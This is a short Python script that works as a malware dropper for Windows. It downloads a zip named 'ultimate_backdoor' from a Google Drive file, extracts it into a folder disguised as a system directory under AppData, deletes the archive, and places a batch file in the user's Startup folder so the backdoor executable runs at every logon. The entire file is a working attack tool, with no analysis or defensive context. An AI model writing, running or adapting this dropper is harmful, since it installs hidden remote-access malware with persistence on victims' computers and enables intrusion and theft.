from google_drive_downloader import GoogleDriveDownloader as g
import getpass
import os
from zipfile import ZipFile

username = getpass.getuser()

try:
    os.makedirs('C:\\Users\\{}\\Appdata\\Roaming\\Windows'.format(username))
except:
    print('dir exists')

g.download_file_from_google_drive(file_id='1vFlwyE6PMAAc4w57xxj6oi1ifZZKii28', dest_path='C:\\Users\\{}\\Appdata\\Roaming\\Windows\\ultimate_backdoor.zip'.format(username))
with ZipFile('C:\\Users\\{}\\Appdata\\Roaming\\Windows\\ultimate_backdoor.zip'.format(username), 'r') as zipObj:
    zipObj.extractall('C:\\Users\\{}\\Appdata\\Roaming\\Windows\\ultimate_backdoor'.format(username))

os.remove('C:\\Users\\{}\\Appdata\\Roaming\\Windows\\ultimate_backdoor.zip'.format(username))

txt = 'start C:\\Users\\{}\\AppData\\Roaming\\Windows\\ultimate_backdoor\\ultimate_backdoor\\ultimate_backdoor.exe'.format(username)

file = open('C:\\Users\\{}\\Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\trigger.txt'.format(username), 'wb')
file.write(txt.encode())
file.close()

os.rename('C:\\Users\\{}\\Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\trigger.txt'.format(username), 'C:\\Users\\{}\\Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\trigger.bat'.format(username))